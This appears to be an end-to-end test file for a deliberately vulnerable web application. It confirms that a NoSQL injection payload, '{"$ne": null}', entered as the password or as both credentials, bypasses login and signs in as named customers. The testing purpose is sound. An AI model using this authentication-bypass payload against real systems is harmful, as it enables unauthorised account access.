'use strict';
const HelperFunctions = require('./helperFunctions.js');

describe('NoSQL Injection', function () {
    afterEach(function () {
        HelperFunctions.logout(browser);
    });

    describe('Login with username and password as NoSQL Query', function () {
        it('should be successfully', function () {
            HelperFunctions.login(browser, '{"$ne": null}', '{"$ne": null}');
            //Check
            element(by.css('.menu-item-username')).getText().then(function(username) {
                expect(username.length).toBeGreaterThan(0);
            });
        });
    });

    describe('Login with username as Value and password as NoSQL Query', function () {
        it('should be successfully', function () {
            HelperFunctions.login(browser, 'customer0', '{"$ne": null}');
            //Check
            expect(element.all(by.css('.menu-item-username')).get(0).getText()).toBe('Juliane Schulze');
        });
    });

    describe('Login with username as Value and password as NoSQL Query', function () {
        it('should be successfully', function () {
            HelperFunctions.login(browser, 'customer1', '{"$ne": null}');
            //Check
            expect(element.all(by.css('.menu-item-username')).get(0).getText()).toBe('Peter Holzmann');
        });
    });
});
